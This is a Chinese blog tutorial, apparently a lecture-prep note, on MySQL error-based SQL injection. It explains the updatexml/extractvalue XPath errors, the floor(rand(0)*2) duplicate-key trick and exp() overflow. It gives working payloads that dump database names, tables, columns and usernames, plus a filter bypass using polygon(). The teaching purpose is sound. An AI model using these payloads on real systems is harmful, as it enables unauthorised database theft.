---
title: "Sql注入学习之报错注入"
date: 2019-11-13T17:06:49+08:00
draft: flase
tags: ['SQL注入,报错注入']
categories: ['SQL注入']
---
需要讲课，学习下报错注入
<!--more-->

## xmlpath报错
通过xml函数进行报错，来进行注入。主要涉及2个函数:<br>
1、updatexml()<br>
2、extractvalue()<br>

updatexml((XML_document, XPath_string, new_value):<br>

第一个参数：xml文档的名称<br>

第二个参数：xpath格式的字符串<br>

第三个参数：替换查找到的符合条件的数据<br>

简而言之功能就是查找一个字符串，并进行替换。而我们在xpath也就是第二个参数那里传入xpath不认识的特殊字符，并加上一些查询语句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理

### updatexml报错注入

#### 注意事项
- 必须是在xpath那里传特殊字符，mysql才会报错，而我们又要注出数据，没这么多位置，所以要用到concat函数
- xpath只会对特殊字符进行报错，这里我们可以用~，16进制的0x7e来进行利用
- xpath只会报错32个字符，所以要用到substr

#### Payload
- 爆数据库版本
```mysql
updatexml(1,concat(0x7e,version(),0x7e),1)
```

- 爆所有数据库
```mysql
updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,32) from information_schema.schemata)),0x7e)
```

- 爆所有表
```mysql
updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema=database()),0x7e),1)
```

- 爆所有列
```mysql
updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,32) from information_schema.columns where table_schema=database()),0x7e),1)
```

- 爆数据
```mysql
updatexml(1,concat(0x7e,(select substr(group_concat(username),1,32) from users),0x7e),1)
```

### Extractvalue报错注入
extractvalue(xml_str , Xpath)
第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径<br>

还是对第二个参数xpath传入特殊字符，让它报错，跟updatexml的payload差不多，只不过一个是3个参数，一个是两个，这里就不详细列出来了
```mysql
extractvalue(1,concat(0x7e,version(),1))
```

)

## 主键重复
先来看下几个要用的函数和语句<br>
<h3>count(*)</h3>
返回表中的记录数，一般配合group by使用，如果直接使用count，其实就是记录列名的行数<br>
  <h3>group by</h3>
group by a，结合count进行分组排序。group by会创建一个虚拟表，把a作为一个主键，去循环真实表的每行数据，group by可能会执行两次运算，第一次获取a这个字段，如果存在，则直接执行count(),不执行第二次运算。第二次也就是不存在，则把这个数据插入虚拟表。这里要注意，因为是把group a作为主键，所以如果插入重复数据则会报错
<h3>floor(a)</h3>
返回小于等于a值的最大整数
<h3>rand()</h3>
返回0-1随机小数，一般配合floor来使用。rand(0)不是随机的，它会返回固定的小数，我们就是利用这个特性来进行注入

### 原理
我们来看下rand(0)返回的固定小数
![avatar](https://ae01.alicdn.com/kf/U0534418376e948f89d8d90b90d6735c84.png)
假如我们现在有一个test表，里面有6行数据，两个字段<br>
再来执行一条sql语句,看看是什么流程:
```mysql
select count(*) from test group by floor(rand(0)*2)
```
1、建立一个虚拟表

|  key   | count|
|  ----  | ----  |
|     |

2、第一次执行floor(rand(0)*2，因为第rand(0)第一次结果为0.155...，乘以2也是0.3...，floor取整就是0(第一次运算)。表中没有数据，mysql执行第二次运算，准备把数据插入到虚拟表中，而floor(rand(0)*2又被执行了一次(第二次运算)，这次取整之后是1，把数据1插入到虚拟表中

|  key   | count|
|  ----  | ----  |
|    1 |    1

3、继续执行floor(rand(0)*2(第三次运算),这次是1，不需要进行二次运算，所以直接被插入到虚拟表中

|  key   | count|
|  ----  | ----  |
|    1 |    1+1

4、继续执行floor(rand(0)*2(第四次运算),结果为0，主键没0，准备插入到虚拟表中，floor(rand(0)*2又被执行了一次(第五次)，结果为1，准备插入到虚拟表中，发现已经有主键为1了，所以会报错。

### 构造payload
可能有点绕，但是只要理解了group by可能会执行2次，和rand(0)稳定值，就应该大概能理解了
```mysql
select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x
```
## 数据类型溢出
利用~进行数据溢出，这里不是太懂原理，直接贴出payload
```mysql
select exp(~(select*from(select user())x))
```
## 小tips

### 过滤information_schema
如果程序过滤information_schema，无法获取表名，利用polygon()进行绕过，括号里填上存在的列名(一般都有id这个列)，即可爆出表名
![avatar](https://ae01.alicdn.com/kf/Ucca695de38604ed087174db360c194e4V.png)
##  参考文章
https://xz.aliyun.com/t/253<br>
https://y4er.com/post/mysql-injection-learn/
